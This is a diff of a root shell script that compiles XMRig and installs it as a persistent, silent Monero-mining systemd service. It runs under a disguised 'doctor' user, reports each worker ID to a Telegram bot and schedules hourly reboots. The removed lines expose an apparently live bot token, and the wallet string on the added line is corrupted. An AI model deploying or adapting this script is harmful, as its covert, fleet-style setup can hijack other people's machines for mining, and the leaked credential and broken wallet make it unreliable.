@@ -2,78 +2,53 @@
 set -euo pipefail
 
 if [[ $EUID -ne 0 ]]; then
-  echo "ERROR: Please run as root or with sudo." >&2
+  echo "Run as root or with sudo"
   exit 1
 fi
 
-# Telegram bot config (optional, remove if you don't want)
-TG_BOT_TOKEN="8202416073:AAGv6s9dycfPZt0hSH-9zRJC4ovmy1RjNZE"
-TG_CHAT_ID="5304966667"
-
+# Telegram bot config (optional)
+TG_BOT_TOKEN="YOUR_BOT_TOKEN"
+TG_CHAT_ID="YOUR_CHAT_ID"
 send_tg() {
   local text="$1"
   curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" \
     -d chat_id="$TG_CHAT_ID" \
     -d parse_mode="Markdown" \
-    -d text="$text" > /dev/null
+    -d text="$text" >/dev/null || true
 }
 
-BASE_WALLET="42ZN85ZmYaKMSVZaF7hz7KCSVe73MBxH1JjJg3uQdY9d8ZcYZBCDkvoeJ5YmevGb6cPJmvWVaRoJMMEU3gcU4eCoAtkLvRE"
 WORKER_ID="${1:-A00001}"
+BASE_WALLET="42ZN85ZmYaKMSVZaF7hz7KCSVe73MBxH1Jjg3uQdY9d8cYZBCDkvoeJ5YmevGb6cPJmvWVaRoJMMEU3gcU4eCoAtkLvRE"
 WALLET="$BASE_WALLET.$WORKER_ID"
+
+# Create user doctor if missing
+if ! id -u doctor &>/dev/null; then
+  useradd -m -r -s /usr/sbin/nologin doctor
+fi
 
 CPU_CORES=$(nproc)
 THREADS=$(( CPU_CORES > 1 ? CPU_CORES - 1 : 1 ))
 
-echo "Using wallet: $WALLET"
-echo "Mining on $THREADS threads (CPU cores: $CPU_CORES)"
-
-echo "Updating package lists..."
-apt update -y
-
-echo "Installing required packages..."
+apt update
 apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen curl libcap2-bin
 
-echo "Setting memlock limits..."
-if ! grep -q '* soft memlock 262144' /etc/security/limits.conf; then
-  echo -e "* soft memlock 262144\n* hard memlock 262144" >> /etc/security/limits.conf
-fi
-
-echo "Updating PAM session files..."
+# Setup limits & hugepages
+grep -q '* soft memlock 262144' /etc/security/limits.conf || echo -e "* soft memlock 262144\n* hard memlock 262144" >> /etc/security/limits.conf
 for f in /etc/pam.d/common-session /etc/pam.d/common-session-noninteractive; do
-  if ! grep -q pam_limits.so "$f"; then
-    echo 'session required pam_limits.so' >> "$f"
-  fi
+  grep -q pam_limits.so "$f" || echo 'session required pam_limits.so' >> "$f"
 done
-
-echo "Setting hugepages..."
-if ! grep -q 'vm.nr_hugepages=128' /etc/sysctl.conf; then
-  echo "vm.nr_hugepages=128" >> /etc/sysctl.conf
-fi
+grep -q 'vm.nr_hugepages=128' /etc/sysctl.conf || echo "vm.nr_hugepages=128" >> /etc/sysctl.conf
 sysctl -p
-
-echo "Setting screen capabilities..."
 setcap cap_sys_nice=eip "$(which screen)"
 
-echo "Preparing XMRig source code..."
-cd /root
-
+cd /home/doctor
 if [ ! -d xmrig ]; then
-  echo "Cloning xmrig repository..."
-  git clone https://github.com/xmrig/xmrig.git
+  sudo -u doctor git clone https://github.com/xmrig/xmrig.git
 fi
+cd xmrig/build 2>/dev/null || mkdir -p build && cd build
+sudo -u doctor cmake ..
+sudo -u doctor make -j"$CPU_CORES"
 
-cd xmrig
-mkdir -p build
-cd build
-
-echo "Running cmake..."
-cmake ..
-
-echo "Compiling XMRig miner..."
-make -j"$CPU_CORES"
-
-echo "Creating systemd service file..."
 cat >/etc/systemd/system/xmrig.service <<EOF
 [Unit]
 Description=XMRig Miner Service
@@ -81,11 +56,11 @@ After=network-online.target
 Wants=network-online.target
 
 [Service]
-ExecStart=/root/xmrig/build/xmrig -o pool.supportxmr.com:443 -u $WALLET -k --tls --threads=$THREADS --donate-level=0 --cpu-priority=2 --randomx-mode=fast --randomx-1gb-pages
+ExecStart=/home/doctor/xmrig/build/xmrig -o pool.supportxmr.com:443 -u $WALLET -k --tls --threads=$THREADS --donate-level=0 --cpu-priority=2 --randomx-mode=fast --randomx-1gb-pages
 Restart=always
 LimitMEMLOCK=infinity
-User=root
-WorkingDirectory=/root/xmrig/build
+User=doctor
+WorkingDirectory=/home/doctor/xmrig/build
 StandardOutput=null
 StandardError=null
 
@@ -94,45 +69,12 @@ WantedBy=multi-user.target
 EOF
 
 chmod 644 /etc/systemd/system/xmrig.service
-
-echo "Reloading systemd daemon and enabling service..."
 systemctl daemon-reload
 systemctl enable xmrig
-systemctl restart xmrig
+systemctl start xmrig
 
-echo "Scheduling reboot every 2 hours in root crontab..."
-sudo crontab -l 2>/dev/null | grep -v reboot > /tmp/rootcron || true
-echo "0 */2 * * * /sbin/reboot" | sudo tee -a /tmp/rootcron
-sudo crontab /tmp/rootcron
-rm /tmp/rootcron
+# Schedule hourly reboot via root crontab
+(crontab -l 2>/dev/null | grep -v '/sbin/reboot' || true; echo "0 * * * * /sbin/reboot") | crontab -
 
-echo "Verifying reboot schedule..."
-if ! sudo crontab -l 2>/dev/null | grep -q '/sbin/reboot'; then
-  err="❌ Reboot schedule NOT set in root crontab! Worker ID: $WORKER_ID"
-  echo "$err"
-  send_tg "$err"
-  exit 1
-fi
-
-echo "Verifying xmrig service status..."
-if ! systemctl is-enabled xmrig &>/dev/null; then
-  err="❌ xmrig service is NOT enabled! Worker ID: $WORKER_ID"
-  echo "$err"
-  send_tg "$err"
-  exit 1
-fi
-
-if ! systemctl is-active xmrig &>/dev/null; then
-  err="❌ xmrig service is NOT active! Worker ID: $WORKER_ID"
-  echo "$err"
-  send_tg "$err"
-  exit 1
-fi
-
-echo "--------------------------------------"
-echo "Setup complete."
-echo "Miner running with wallet: $WALLET"
-echo "Reboot scheduled every 2 hours."
-echo "--------------------------------------"
-
-send_tg "✅ *Setup complete*\nMiner running with wallet: \`$WALLET\`\nReboot scheduled every 2 hours.\nWorker ID: \`$WORKER_ID\`"
+echo "Setup complete: Miner running as doctor user and system reboots hourly."
+send_tg "✅ Setup complete\nWorker ID: \`$WORKER_ID\`\nMiner running and system will reboot hourly."
